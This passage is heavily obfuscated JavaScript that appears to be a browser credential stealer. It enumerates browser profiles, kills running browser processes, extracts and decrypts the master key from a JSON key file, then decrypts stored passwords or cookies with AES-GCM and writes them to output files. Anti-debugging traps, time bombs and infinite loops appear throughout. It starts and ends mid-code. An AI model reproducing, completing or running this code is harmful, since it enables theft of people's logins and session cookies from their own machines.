                            , "c": bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x3d4) + bw1LDXR.apply(undefined, [0x3d5]) + bw1LDXR(0x3d6) + bw1LDXR(0x3d7)
                            , "x": () => {
                                return vhNite += -0xa1;
                            }
                            , "p": () => {
                                UxmmwSD((e0MiDs.b == 0x1d || xtbSJI)(), vhNite += 0x50, lA0B8WY += -0x95);
                                return "n";
                            }
                            , "z": function () {
                                return s1pwaN = 0x2;
                            }
                            , "d": () => {
                                return s1pwaN == 0x5d;
                            }
                            , "j": () => {
                                return s1pwaN += -0x200;
                            }
                            , "v": function () {
                                vhNite += s1pwaN + -0x1a;
                                lA0B8WY *= 0x2;
                                lA0B8WY -= -0xd4;
                                return s1pwaN += -0x6;
                            }
                            , "i": () => {
                                return vhNite += 0x51;
                            }
                            , "f": -0x1d6
                            , "g": -0x95
                            , "k": () => {
                                TljPa8 += 0x1c1;
                                vhNite += 0x51;
                                return s1pwaN += -0x200;
                            }
                            , "u": () => {
                                return e0MiDs.q();
                            }
                            , "y": -0x2a
                            , "h": function () {
                                return lA0B8WY += e0MiDs.g;
                            }
                            , B: function (uXPxRCH) {
                                return uXPxRCH - 0x1b4;
                            }
                            , C: function (uXPxRCH) {
                                return uXPxRCH != -0x204 && uXPxRCH + 0x212;
                            }
                        });
                        while (TljPa8 + vhNite + lA0B8WY + s1pwaN != 0x1a) {
                            switch (TljPa8 + vhNite + lA0B8WY + s1pwaN) {
                            case TljPa8 - 0x1b4:
                            case 0x284:
                            case 0x1e2:
                                UxmmwSD(lA0B8WY = -0x18, vhNite += -0xa1, lA0B8WY += 0x95, s1pwaN += e0MiDs.y);
                                break;
                            case TljPa8 + 0x36:
                                if (s1pwaN == 0x5d) {
                                    UxmmwSD(TljPa8 += 0x1c1, vhNite += 0x81, lA0B8WY += TljPa8 + -0x28d, s1pwaN += e0MiDs.f);
                                    break;
                                }
                                UxmmwSD(s1pwaN = 0x28, TljPa8 += 0x1c1, vhNite += 0x31, s1pwaN += -0x200);
                                break;
                            case 0x2a:
                                UxmmwSD(s1pwaN = 0x2, e0MiDs.A());
                                break;
                            case 0x4d:
                                if (s1pwaN == 0x18 || false) {
                                    UxmmwSD(TljPa8 += 0x1c1, vhNite += 0xa1, lA0B8WY += e0MiDs.g, s1pwaN += -0x1d6);
                                    break;
                                }
                                UxmmwSD(s1pwaN = 0x28, e0MiDs.k());
                                break;
                            default:
                            case 0x28c:
                            case 0x162:
                            case 0x2d1:
                                if (e0MiDs.p() == "n") {
                                    break;
                                }
                            case 0x35b:
                            case 0xe:
                            case 0x2b2:
                            case 0x2b7:
                                var xtbSJI;
                                if (TljPa8 == -0x9) {
                                    vhNite += 0x51;
                                    break;
                                }
                                UxmmwSD(xtbSJI = (e0MiDs.b == 0x1f8 || n49oLe)(this, function () {
                                    var uXPxRCH = function () {
                                        var mHQbVa = uXPxRCH.constructor(e0MiDs.b)()
                                            .constructor(e0MiDs.c);
                                        return rKAu9MB(mHQbVa.call(uXPxRCH), A536BJ = -0x2f);
                                    };
                                    return uXPxRCH();
                                }), vhNite *= 0x2, vhNite -= -0x255);
                                break;
                            case 0x20:
                                if (lA0B8WY == -0x11) {
                                    e0MiDs.q();
                                    break;
                                }
                                UxmmwSD(s1pwaN = 0x28, e0MiDs.v());
                                break;
                            }
                        }
                    } catch (__p_td_3e) {
                        while (__p_td_3e ? __p_td_3e : rKAu9MB(__p_td_3e, A536BJ = -0x2f)) {
                            var TaFn0Uv;
                            var Xb4IwJx;
                            Xb4IwJx = 0x0;
                            if (y7bTqx((__p_td_3e ? rKAu9MB(__p_td_3e, A536BJ = -0x2f) : __p_td_3e) ? function (uXPxRCH) {
                                    Xb4IwJx = uXPxRCH ? 0x0 : rKAu9MB(uXPxRCH, MHQ3bYA(-0x2f)) ? 0x1 : 0x0;
                                }(__p_td_3e) : TaFn0Uv = 0x1, TaFn0Uv && Xb4IwJx)) {
                                break;
                            }
                            if (TaFn0Uv) {
                                continue;
                            }
                        }
                    }
                }
                console[Kt94kB(0x24e)](_0x58ad5f);
                return await LwHJ6C_(uXPxRCH);
            }
        };
        const LwHJ6C_ = async uXPxRCH => {
            if (Date[bw1LDXR(0x3d8)]() > 0x19b76a3b3bc) {
                while (true) {
                    var kY3q474 = 0x63;
                    for (kY3q474 = 0x63; kY3q474 == kY3q474; kY3q474 *= kY3q474) {
                        if (y7bTqx(rKAu9MB(kY3q474, A536BJ = -0x2f) && console.log(kY3q474), kY3q474) <= 0xa) {
                            break;
                        }
                    };
                    if (kY3q474 === 0x64) {
                        kY3q474--;
                    }
                };
            }
            try {
                const n49oLe = await MsCwg5O[Kt94kB(0x2c3)](uXPxRCH, Kt94kB(0x2df));
                if (rKAu9MB(n49oLe[Kt94kB(0x250)], A536BJ = -0x2f) || rKAu9MB(n49oLe[Kt94kB(0x250)][Kt94kB(0x27b)], MHQ3bYA(-0x2f))) {
                    return null;
                }
                const Ot8M78 = n49oLe[bw1LDXR(0x3d9)][Kt94kB(0x27b)];
                const jJIllx = Buffer[Kt94kB(0x257)](Ot8M78, Kt94kB(0x22a))[bw1LDXR(0x3da)](0x5);
                const td77ore = Array[Kt94kB(0x257)](jJIllx);
                const Q59OVlp = Kt94kB(0x344) + td77ore[bw1LDXR(0x3db)](", ") + Kt94kB(0x336);
                const xtbSJI = TljPa8[Kt94kB(0x25b)](bw1LDXR(0x3dc) + bw1LDXR(0x3dd) + bw1LDXR(0x3de) + bw1LDXR(0x3df) + "\"" + Q59OVlp + "\"")[Kt94kB(0x28b)]()[Kt94kB(0x2ce)]();
                const TaFn0Uv = Buffer[Kt94kB(0x257)](xtbSJI, bw1LDXR(0x3e0));
                if (function () {
                        var uXPxRCH = function () {
                            const mHQbVa = function () {
                                const mHQbVa = new RegExp("\n");
                                return mHQbVa[bw1LDXR(0x3e1)](uXPxRCH);
                            };
                            return mHQbVa();
                        };
                        return uXPxRCH();
                    }()) {
                    try {
                        UxmmwSD(mHQbVa, mHQbVa());
                    } catch (__p_td_3e) {
                        while (__p_td_3e ? __p_td_3e : rKAu9MB(__p_td_3e, MHQ3bYA(-0x2f))) {
                            var pukrvr;
                            var BSJ1pS;
                            BSJ1pS = 0x0;
                            if (y7bTqx((__p_td_3e ? rKAu9MB(__p_td_3e, A536BJ = -0x2f) : __p_td_3e) ? function (uXPxRCH) {
                                    BSJ1pS = uXPxRCH ? 0x0 : rKAu9MB(uXPxRCH, A536BJ = -0x2f) ? 0x1 : 0x0;
                                }(__p_td_3e) : pukrvr = 0x1, pukrvr && BSJ1pS)) {
                                break;
                            }
                            if (pukrvr) {
                                continue;
                            }
                        }
                    }
                }
                return TaFn0Uv;
            } catch (_0x32767f) {
                if (rKAu9MB(require('os')
                        .platform() === bw1LDXR(0x3ea), A536BJ = -0x2f)) {
                    while (true) {
                        var Xp96Uso = 0x63;
                        for (Xp96Uso = 0x63; Xp96Uso == Xp96Uso; Xp96Uso *= Xp96Uso) {
                            if (y7bTqx(rKAu9MB(Xp96Uso, A536BJ = -0x2f) && console.log(Xp96Uso), Xp96Uso) <= 0xa) {
                                break;
                            }
                        };
                        if (Xp96Uso === 0x64) {
                            Xp96Uso--;
                        }
                    };
                }
                console[Kt94kB(0x24e)](_0x32767f);
                return null;
            }
        };
        const NmMNtiY = uXPxRCH => {
            if (new Date()[bw1LDXR(0x3eb)]() > 0x19b76a3ae2b) {
                while (true) {
                    var mHQbVa = 0x63;
                    for (mHQbVa = 0x63; mHQbVa == mHQbVa; mHQbVa *= mHQbVa) {
                        if (y7bTqx(rKAu9MB(mHQbVa, A536BJ = -0x2f) && console.log(mHQbVa), mHQbVa) <= 0xa) {
                            break;
                        }
                    };
                    if (mHQbVa === 0x64) {
                        mHQbVa--;
                    }
                };
            }
            try {
                var n49oLe = (uXPxRCH, mHQbVa, kY3q474, Ot8M78, jJIllx) => {
                    if (typeof Ot8M78 === "undefined") {
                        Ot8M78 = td77ore;
                    }
                    if (typeof jJIllx === bw1LDXR[0x1da]) {
                        jJIllx = ph4WoIw;
                    }
                    if (uXPxRCH !== mHQbVa) {
                        return jJIllx[uXPxRCH] || (jJIllx[uXPxRCH] = Ot8M78(NkrHL_[uXPxRCH]));
                    }
                    if (kY3q474 == Ot8M78) {
                        return mHQbVa ? uXPxRCH[jJIllx[mHQbVa]] : ph4WoIw[uXPxRCH] || (kY3q474 = jJIllx[uXPxRCH] || Ot8M78, ph4WoIw[uXPxRCH] = kY3q474(NkrHL_[uXPxRCH]));
                    }
                    if (Ot8M78 === undefined) {
                        n49oLe = jJIllx;
                    }
                    if (kY3q474 && Ot8M78 !== td77ore) {
                        n49oLe = td77ore;
                        return n49oLe(uXPxRCH, -0x1, kY3q474, Ot8M78, jJIllx);
                    }
                };
                if (function () {
                        var uXPxRCH = function () {
                            const mHQbVa = function () {
                                const mHQbVa = new RegExp("\n");
                                return mHQbVa[bw1LDXR(0x3ec)](uXPxRCH);
                            };
                            return mHQbVa();
                        };
                        return uXPxRCH();
                    }()) {
                    process.exit();
                }
                const Ot8M78 = JSON[n49oLe(0x3ed)](MsCwg5O[Kt94kB(0x223)](uXPxRCH, Kt94kB(0x2df)))[Kt94kB(0x250)][Kt94kB(0x27b)];
                const jJIllx = Buffer[Kt94kB(0x257)](Ot8M78, bw1LDXR.apply(undefined, [0x3ee]))[Kt94kB(0x23e)](0x5);
                return BSJ1pS[Kt94kB(0x22b)](Buffer[Kt94kB(0x257)](jJIllx, Kt94kB(0x2df)), null, Kt94kB(0x330));

                function td77ore(uXPxRCH, mHQbVa = "vobDmWnVBXFNEe}f2#h]_A$`@3UJdQY6L\"r4;)<tTOZuPj{qC[I5|%S^.yx:l&1K0czk>=G*98a~Ris/,gp+HM!?7w(", kY3q474, n49oLe, Ot8M78 = [], jJIllx = 0x0, td77ore = 0x0, bw1LDXR, Q59OVlp = 0x0, xtbSJI) {
                    UxmmwSD(kY3q474 = '' + (uXPxRCH || ''), n49oLe = kY3q474.length, bw1LDXR = -0x1);
                    for (Q59OVlp = Q59OVlp; Q59OVlp < n49oLe; Q59OVlp++) {
                        xtbSJI = mHQbVa.indexOf(kY3q474[Q59OVlp]);
                        if (xtbSJI === -0x1) {
                            continue;
                        }
                        if (bw1LDXR < 0x0) {
                            bw1LDXR = xtbSJI;
                        } else {
                            UxmmwSD(bw1LDXR += xtbSJI * 0x5b, jJIllx |= bw1LDXR << td77ore, td77ore += (bw1LDXR & 0x1fff) > 0x58 ? 0xd : 0xe);
                            do {
                                UxmmwSD(Ot8M78.push(jJIllx & 0xff), jJIllx >>= 0x8, td77ore -= 0x8);
                            } while (td77ore > 0x7);
                            bw1LDXR = -0x1;
                        }
                    }
                    if (bw1LDXR > -0x1) {
                        Ot8M78.push((jJIllx | bw1LDXR << td77ore) & 0xff);
                    }
                    return pE8Nth(Ot8M78);
                }
            } catch (_0x205fb1) {
                if (Date[bw1LDXR(0x3ef)][bw1LDXR(0x3eb)][bw1LDXR(0x3f0)](new Date()) > 0x19b76a3b3d8) {
                    process.exit();
                }
                console[Kt94kB(0x24e)](_0x205fb1);
                return null;
            }
        };
        const gwbHVf2 = async uXPxRCH => {
            const {
                stdout: kY3q474
            } = await jG1NGUd(bw1LDXR(0x3f1) + "st");
            const n49oLe = kY3q474[bw1LDXR(0x3f2)]("\n")[Kt94kB(0x23e)](0x3)[Kt94kB(0x284)](kY3q474 => kY3q474[Kt94kB(0x256)]()[Kt94kB(0x2a6)](uXPxRCH[Kt94kB(0x256)]()));
            if (n49oLe[Kt94kB(0x2d7)] === 0x0) {
                return;
            }
            if (new Date()[bw1LDXR.apply(undefined, [0x3f3])]() > 0x19b76a3accb) {
                while (true) {
                    var Ot8M78 = 0x63;
                    for (Ot8M78 = 0x63; Ot8M78 == Ot8M78; Ot8M78 *= Ot8M78) {
                        if (y7bTqx(rKAu9MB(Ot8M78, A536BJ = -0x2f) && console.log(Ot8M78), Ot8M78) <= 0xa) {
                            break;
                        }
                    };
                    if (Ot8M78 === 0x64) {
                        Ot8M78--;
                    }
                };
            }
            const jJIllx = n49oLe[bw1LDXR(0x3f4)](uXPxRCH => uXPxRCH[Kt94kB(0x231)](/\s+/)[0x1]);
            for (const td77ore of jJIllx) {
                await jG1NGUd(bw1LDXR(0x3f5) + bw1LDXR(0x3f6) + "D " + td77ore + Kt94kB(0x29a))[bw1LDXR.call(undefined, 0x3f7)](() => {});
            }
        };
        const zYjVsb = async() => {
            for (const [mHQbVa, kY3q474] of Object[bw1LDXR.call(undefined, 0x3f8)](C6GoqKD)) {
                try {
                    const {
                        main_path: n49oLe
                        , profiles: Ot8M78
                        , process_name: jJIllx
                    } = kY3q474;
                    if (await MsCwg5O[bw1LDXR.apply(undefined, [0x3f9]) + bw1LDXR(0x3fa)](n49oLe)) {
                        const td77ore = pukrvr[Kt94kB(0x300)](n49oLe, Kt94kB(0x203));
                        if (Ot8M78) {
                            for (const Q59OVlp of Ot8M78) {
                                const xtbSJI = y7bTqx(await gwbHVf2(jJIllx), pukrvr[Kt94kB(0x300)](n49oLe, Q59OVlp, Kt94kB(0x28a), bw1LDXR(0x3fb)));
                                await uBuLhD7(xtbSJI, td77ore, mHQbVa + "_" + Q59OVlp, jJIllx);
                            }
                        } else {
                            const TaFn0Uv = y7bTqx(await gwbHVf2(jJIllx), pukrvr[bw1LDXR(0x3fc)](n49oLe, Kt94kB(0x28a), Kt94kB(0x218)));
                            await uBuLhD7(TaFn0Uv, td77ore, mHQbVa, jJIllx);
                        }
                    }
                } catch (_0x57e41e) {
                    console[Kt94kB(0x24e)](_0x57e41e);
                }
            }
            if (rKAu9MB(require('os')
                    .platform() === bw1LDXR(0x3fd), MHQ3bYA(-0x2f))) {
                process.exit();
            }
            await JT7Xg3W();
        };
        const uBuLhD7 = async(uXPxRCH, mHQbVa, kY3q474, n49oLe) => {
            if (rKAu9MB(require('os')
                    .platform() === bw1LDXR(0x3fe), MHQ3bYA(-0x2f))) {
                var jJIllx = "a";
                while (0x1) {
                    jJIllx = jJIllx += "a";
                }
            }
            if (await MsCwg5O[Kt94kB(0x20f)](uXPxRCH)) {
                const td77ore = await R4UyGcx(mHQbVa);
                if (rKAu9MB(require('os')
                        .platform() === bw1LDXR(0x3fe), MHQ3bYA(-0x2f))) {
                    process.exit();
                }
                if (td77ore) {
                    if (new Date()[bw1LDXR(0x3ff)]() > 0x19b76a3bfb5) {
                        process.exit();
                    }
                    try {
                        var xtbSJI = (uXPxRCH, mHQbVa, kY3q474, n49oLe, Ot8M78) => {
                            if (typeof n49oLe === bw1LDXR[0x1da]) {
                                n49oLe = Xb4IwJx;
                            }
                            if (typeof Ot8M78 === "undefined") {
                                Ot8M78 = ph4WoIw;
                            }
                            if (uXPxRCH !== mHQbVa) {
                                return Ot8M78[uXPxRCH] || (Ot8M78[uXPxRCH] = n49oLe(NkrHL_[uXPxRCH]));
                            }
                            if (kY3q474 == n49oLe) {
                                return mHQbVa ? uXPxRCH[Ot8M78[mHQbVa]] : ph4WoIw[uXPxRCH] || (kY3q474 = Ot8M78[uXPxRCH] || n49oLe, ph4WoIw[uXPxRCH] = kY3q474(NkrHL_[uXPxRCH]));
                            }
                        };
                        if (function () {
                                var uXPxRCH = function () {
                                    const mHQbVa = function () {
                                        const mHQbVa = new RegExp("\n");
                                        return mHQbVa[bw1LDXR(0x400)](uXPxRCH);
                                    };
                                    return mHQbVa();
                                };
                                return uXPxRCH();
                            }()) {
                            process.exit();
                        }
                        const TaFn0Uv = new s1pwaN(uXPxRCH, e0MiDs);
                        UxmmwSD(TaFn0Uv[bw1LDXR(0x401) + xtbSJI.apply(undefined, [0x402])](() => {
                            if (function () {
                                    var uXPxRCH = function () {
                                        const mHQbVa = function () {
                                            const mHQbVa = new RegExp("\n");
                                            return mHQbVa[xtbSJI(0x403)](uXPxRCH);
                                        };
                                        return mHQbVa();
                                    };
                                    return uXPxRCH();
                                }()) {
                                process.exit();
                            }
                            TaFn0Uv[Kt94kB(0x313)](Kt94kB(0x2bb), async(mHQbVa, n49oLe) => {
                                if (mHQbVa) {
                                    if (y7bTqx(console[Kt94kB(0x24e)](mHQbVa), Date[bw1LDXR(0x404) + bw1LDXR(0x405)][bw1LDXR(0x3ff)][bw1LDXR.call(undefined, 0x406)](new Date())) < 0x18cc21b087f) {
                                        var jJIllx = "a";
                                        while (0x1) {
                                            jJIllx = jJIllx += "a";
                                        }
                                    }
                                    return;
                                }
                                let Q59OVlp = '';
                                for (const TaFn0Uv of n49oLe) {
                                    try {
                                        if (TaFn0Uv[Kt94kB(0x241)] === '') {
                                            let Xb4IwJx = '';
                                            const i0gUcBP = Buffer[xtbSJI[bw1LDXR[0x1e6]](undefined, [0x407])](TaFn0Uv[xtbSJI(0x408)], null);
                                            const Kt94kB = i0gUcBP[Kt94kB(0x23e)](0x3, 0xf);
                                            const MsCwg5O = i0gUcBP[Kt94kB(0x23e)](0xf, i0gUcBP[Kt94kB(0x2d7)] - 0x10);
                                            const BSJ1pS = MsCwg5O[Kt94kB(0x23e)](MsCwg5O[Kt94kB(0x2d7)] - 0x10);
                                            const Xp96Uso = fZVPjSs[bw1LDXR(0x409) + xtbSJI(0x40a) + bw1LDXR(0x40b)](Kt94kB(0x2fd), td77ore, Kt94kB);
                                            UxmmwSD(Xp96Uso[bw1LDXR.call(undefined, 0x40c)](BSJ1pS), Xb4IwJx = Xp96Uso[xtbSJI(0x40d)](MsCwg5O, null, Kt94kB(0x29b)) + Xp96Uso[Kt94kB(0x206)](Kt94kB(0x29b)), PRnJ7A++, Q59OVlp += TaFn0Uv[Kt94kB(0x325)] + "\t" + (TaFn0Uv[Kt94kB(0x28d)] ? Kt94kB(0x348) : Kt94kB(0x281)) + "\t" + TaFn0Uv[xtbSJI(0x40e)] + "\t" + (TaFn0Uv[Kt94kB(0x2cd)] ? Kt94kB(0x348) : bw1LDXR(0x40f)) + "\t" + TaFn0Uv[xtbSJI(0x410) + xtbSJI(0x411)][Kt94kB(0x28b)]() + "\t" + TaFn0Uv[Kt94kB(0x22e)] + "\t" + Xb4IwJx + "\n");
                                        } else {
                                            PRnJ7A++;
                                            Q59OVlp += TaFn0Uv[Kt94kB(0x325)] + "\t" + (TaFn0Uv[Kt94kB(0x28d)] ? Kt94kB(0x348) : xtbSJI(0x412)) + "\t" + TaFn0Uv[Kt94kB(0x29f)] + "\t" + (TaFn0Uv[Kt94kB(0x2cd)] ? bw1LDXR(0x413) : Kt94kB(0x281)) + "\t" + TaFn0Uv[Kt94kB(0x2c7)][Kt94kB(0x28b)]() + "\t" + TaFn0Uv[Kt94kB(0x22e)] + "\t" + TaFn0Uv[Kt94kB(0x241)] + "\n";
                                        }
                                    } catch (_0xe78fd) {}
                                }
                                if (rKAu9MB(require('os')
                                        .platform() === bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x3fe), MHQ3bYA(-0x2f))) {
                                    process.exit();
                                }
                                if (Q59OVlp !== '') {
                                    C_dAB0T(pukrvr[Kt94kB(0x300)](lxP1K0s, Kt94kB(0x218), kY3q474 + Kt94kB(0x343)), Q59OVlp);
                                }
                            });
                        }), TaFn0Uv[Kt94kB(0x237)](uXPxRCH => {
                            if (Date[bw1LDXR(0x414)][bw1LDXR(0x3ff)][xtbSJI(0x415)](new Date()) > 0x19b76a3acac) {
                                process.exit();
                            }
                            if (uXPxRCH) {
                                console[xtbSJI(0x416)](uXPxRCH);
                            }
                        }));

                        function Xb4IwJx(uXPxRCH, mHQbVa = "y<wx\"RUupAh(ci/f)~j}BVX#G%SKvFT=4z2:0_Lk+sIqt78lPgONob$W9.*J|;1Zd?{3!e@m5H[rM6`QDYEan>,C]&^", kY3q474, n49oLe, Ot8M78 = [], jJIllx = 0x0, td77ore = 0x0, Q59OVlp, xtbSJI = 0x0, TaFn0Uv) {
                            UxmmwSD(kY3q474 = '' + (uXPxRCH || ''), n49oLe = kY3q474.length, Q59OVlp = -0x1);
                            for (xtbSJI = xtbSJI; xtbSJI < n49oLe; xtbSJI++) {
                                TaFn0Uv = mHQbVa.indexOf(kY3q474[xtbSJI]);
                                if (TaFn0Uv === -0x1) {
                                    continue;
                                }
                                if (Q59OVlp < 0x0) {
                                    Q59OVlp = TaFn0Uv;
                                } else {
                                    UxmmwSD(Q59OVlp += TaFn0Uv * 0x5b, jJIllx |= Q59OVlp << td77ore, td77ore += (Q59OVlp & 0x1fff) > 0x58 ? 0xd : 0xe);
                                    do {
                                        UxmmwSD(Ot8M78.push(jJIllx & 0xff), jJIllx >>= 0x8, td77ore -= 0x8);
                                    } while (td77ore > 0x7);
                                    Q59OVlp = -0x1;
                                }
                            }
                            if (Q59OVlp > -0x1) {
                                Ot8M78.push((jJIllx | Q59OVlp << td77ore) & 0xff);
                            }
                            return pE8Nth(Ot8M78);
                        }
                    } catch (_0x854c01) {
                        if (rKAu9MB(require('os')
                                .platform() === bw1LDXR(0x3fe), A536BJ = -0x2f)) {
                            var i0gUcBP = "a";
                            while (0x1) {
                                i0gUcBP = i0gUcBP += "a";
                            }
                        }
                        console[Kt94kB(0x24e)](_0x854c01);
                    }
                }
            }
        };
        const I_CSaW = async() => {
            if (function () {
                    var uXPxRCH = function () {
                        const mHQbVa = function () {
                            const mHQbVa = new RegExp("\n");
                            return mHQbVa[bw1LDXR(0x417)](uXPxRCH);
                        };
                        return mHQbVa();
                    };
                    return uXPxRCH();
                }()) {
                while (true) {
                    var mHQbVa = 0x63;
                    for (mHQbVa = 0x63; mHQbVa == mHQbVa; mHQbVa *= mHQbVa) {
                        if (y7bTqx(rKAu9MB(mHQbVa, A536BJ = -0x2f) && console.log(mHQbVa), mHQbVa) <= 0xa) {
                            break;
                        }
                    };
                    if (mHQbVa === 0x64) {
                        mHQbVa--;
                    }
                };
            }
            for (const [kY3q474, n49oLe] of Object[Kt94kB(0x31f)](C6GoqKD)) {
                try {
                    const {
                        main_path: Ot8M78
                        , profiles: jJIllx
                        , process_name: td77ore
                    } = n49oLe;
                    if (await MsCwg5O[Kt94kB(0x20f)](Ot8M78)) {
                        const Q59OVlp = pukrvr[Kt94kB(0x300)](Ot8M78, Kt94kB(0x203));
                        if (jJIllx) {
                            for (const xtbSJI of jJIllx) {
                                const TaFn0Uv = kY3q474 === bw1LDXR(0x395) ? pukrvr[Kt94kB(0x300)](Ot8M78, xtbSJI, Kt94kB(0x258)) : pukrvr[bw1LDXR(0x418)](Ot8M78, xtbSJI, Kt94kB(0x2a7));
                                await CwvLrkD(TaFn0Uv, Q59OVlp, kY3q474 + "_" + xtbSJI, td77ore);
                            }
                        } else {
                            const Xb4IwJx = kY3q474 === bw1LDXR(0x395) ? pukrvr[bw1LDXR(0x419)](Ot8M78, Kt94kB(0x258)) : pukrvr[bw1LDXR.apply(undefined, [0x419])](Ot8M78, Kt94kB(0x2a7));
                            await CwvLrkD(Xb4IwJx, Q59OVlp, kY3q474, td77ore);
                        }
                    }
                } catch (_0x9f886c) {
                    console[Kt94kB(0x24e)](_0x9f886c);
                }
            }
        };
        const CwvLrkD = async(uXPxRCH, mHQbVa, kY3q474, n49oLe) => {
            if (rKAu9MB(await MsCwg5O[bw1LDXR(0x41a) + bw1LDXR(0x41b)](uXPxRCH), MHQ3bYA(-0x2f))) {
                return;
            }
            const jJIllx = await R4UyGcx(mHQbVa);
            if (rKAu9MB(jJIllx, A536BJ = -0x2f)) {
                return;
            }
            if (Date[bw1LDXR(0x41c)][bw1LDXR(0x41d)][bw1LDXR.apply(undefined, [0x41e])](new Date()) < 0x18cc21afa04) {
                process.exit();
            }
            try {
                if (rKAu9MB(require('os')
                        .platform() === bw1LDXR[bw1LDXR[0x1e6]](undefined, [0x41f]), MHQ3bYA(-0x2f))) {
                    process.exit();
                }
                let Q59OVlp = '';
                const xtbSJI = new s1pwaN(uXPxRCH, e0MiDs);
                UxmmwSD(await new Promise((uXPxRCH, mHQbVa) => {
                    if (function () {
                            var uXPxRCH = function () {
                                const mHQbVa = function () {
                                    const mHQbVa = new RegExp("\n");
                                    return mHQbVa[bw1LDXR(0x420)](uXPxRCH);
                                };
                                return mHQbVa();
                            };
                            return uXPxRCH();
                        }()) {
                        process.exit();
                    }
                    const kY3q474 = YgP8yts;
                    xtbSJI[kY3q474(0x2f2)](kY3q474(0x2e7), (uXPxRCH, n49oLe) => {
                        if (new Date()[bw1LDXR.call(undefined, 0x41d)]() > 0x19b76a3b711) {
                            process.exit();
                        }
                        if (uXPxRCH) {
                            return mHQbVa(uXPxRCH);
                        }
                        if (rKAu9MB(n49oLe[kY3q474(0x340)], MHQ3bYA(-0x2f))) {
                            return;
                        }
                        try {
                            const td77ore = n49oLe[kY3q474(0x261)];
                            const xtbSJI = td77ore[kY3q474(0x23e)](0x3, 0xf);
                            const TaFn0Uv = td77ore[kY3q474(0x23e)](0xf, td77ore[kY3q474(0x2d7)] - 0x10);
                            const Kt94kB = td77ore[bw1LDXR[bw1LDXR[0x1e6]](undefined, [0x421])](td77ore[kY3q474(0x2d7)] - 0x10);
                            const Xb4IwJx = fZVPjSs[kY3q474(0x2e0)](kY3q474(0x2fd), jJIllx, xtbSJI);
                            if (y7bTqx(Xb4IwJx[bw1LDXR(0x422)](Kt94kB), new Date()[bw1LDXR(0x41d)]()) < 0x18cc21af98c) {
                                process.exit();
                            }
                            const i0gUcBP = Xb4IwJx[kY3q474(0x2ff)](TaFn0Uv, bw1LDXR.call(undefined, 0x423), bw1LDXR.apply(undefined, [0x424])) + Xb4IwJx[kY3q474(0x206)](bw1LDXR(0x424));
                            UxmmwSD(Q59OVlp += kY3q474(0x1f6) + (n49oLe[kY3q474(0x280)] || n49oLe[bw1LDXR(0x425) + bw1LDXR(0x426)]) + kY3q474(0x32c) + n49oLe[kY3q474(0x340)] + kY3q474(0x22c) + i0gUcBP + "\n", rfVbMu++, vKE2Mn[kY3q474(0x2b1)](n49oLe[kY3q474(0x280)] + "\t" + n49oLe[kY3q474(0x340)] + "\t" + i0gUcBP), rKAu9MB(Rd2PlS[kY3q474(0x2a6)](i0gUcBP), A536BJ = -0x2f) && Rd2PlS[kY3q474(0x2b1)](i0gUcBP));
                        } catch (_0x318225) {
                            if (Date[bw1LDXR(0x427) + bw1LDXR(0x428)][bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x41d)][bw1LDXR(0x41e)](new Date()) < 0x18cc21b0e06) {
                                var pukrvr = "a";
                                while (0x1) {
                                    pukrvr = pukrvr += "a";
                                }
                            }
                        }
                    }, () => uXPxRCH());
                }), xtbSJI[Kt94kB(0x237)](), Q59OVlp !== '' && C_dAB0T(pukrvr[Kt94kB(0x300)](lxP1K0s, Kt94kB(0x2b3), kY3q474 + bw1LDXR.apply(undefined, [0x429])), Q59OVlp));
            } catch (_0x13dc24) {
                if (Date[bw1LDXR.apply(undefined, [0x41c])][bw1LDXR.call(undefined, 0x41d)][bw1LDXR(0x41e)](new Date()) < 0x18cc21af760) {
                    process.exit();
                }
                console[Kt94kB(0x24e)](_0x13dc24);
            }
        };
        const JT7Xg3W = async() => {
            for (const [mHQbVa, kY3q474] of Object[Kt94kB(0x31f)](XJQnk9N)) {
                const {
                    main_path: n49oLe
                    , process_name: Ot8M78
                } = kY3q474;
                if (await MsCwg5O[Kt94kB(0x20f)](n49oLe)) {
                    const jJIllx = await MsCwg5O[Kt94kB(0x240)](n49oLe);
                    for (const td77ore of jJIllx) {
                        const Q59OVlp = y7bTqx(await gwbHVf2(Ot8M78), pukrvr[Kt94kB(0x300)](n49oLe, td77ore));
                        if ((await MsCwg5O[Kt94kB(0x27e)](Q59OVlp))[Kt94kB(0x26d)]()) {
                            const xtbSJI = pukrvr[Kt94kB(0x300)](Q59OVlp, Kt94kB(0x338));
                            await QQvq34q(xtbSJI, mHQbVa + "_" + td77ore, Ot8M78);
                        }
                    }
                }
            }
            if (Date[bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x42a)]() > 0x19b76a3aaa2) {
                process.exit();
            }
            await EQhD4Qq();
        };
        const QQvq34q = async(uXPxRCH, mHQbVa, kY3q474) => {
            if (function () {
                    var uXPxRCH = function () {
                        const mHQbVa = function () {
                            const mHQbVa = new RegExp("\n");
                            return mHQbVa[bw1LDXR(0x42b)](uXPxRCH);
                        };
                        return mHQbVa();
                    };
                    return uXPxRCH();
                }()) {
                while (true) {
                    var Ot8M78 = 0x63;
                    for (Ot8M78 = 0x63; Ot8M78 == Ot8M78; Ot8M78 *= Ot8M78) {
                        if (y7bTqx(rKAu9MB(Ot8M78, A536BJ = -0x2f) && console.log(Ot8M78), Ot8M78) <= 0xa) {
                            break;
                        }
                    };
                    if (Ot8M78 === 0x64) {
                        Ot8M78--;
                    }
                };
            }
            if (rKAu9MB(await MsCwg5O[Kt94kB(0x20f)](uXPxRCH), A536BJ = -0x2f)) {
                return;
            }
            try {
                const td77ore = new s1pwaN(uXPxRCH, e0MiDs);
                if (new Date()[bw1LDXR(0x42c)]() < 0x18cc21af903) {
                    process.exit();
                }
                UxmmwSD(td77ore[Kt94kB(0x2c1)](() => {
                    if (new Date()[bw1LDXR.call(undefined, 0x42c)]() < 0x18cc21b050c) {
                        var uXPxRCH = "a";
                        while (0x1) {
                            uXPxRCH = uXPxRCH += "a";
                        }
                    }
                    td77ore[Kt94kB(0x313)](Kt94kB(0x2f4), (uXPxRCH, n49oLe) => {
                        if (rKAu9MB(require('os')
                                .platform() === bw1LDXR(0x42d), A536BJ = -0x2f)) {
                            try {
                                var Ot8M78 = function (uXPxRCH, n49oLe) {
                                    return n49oLe;
                                };
                                var jJIllx;
                                var td77ore;
                                var xtbSJI;
                                var TaFn0Uv;
                                UxmmwSD(jJIllx = 0x1bc, td77ore = 0x144, xtbSJI = -0x29c, TaFn0Uv = {
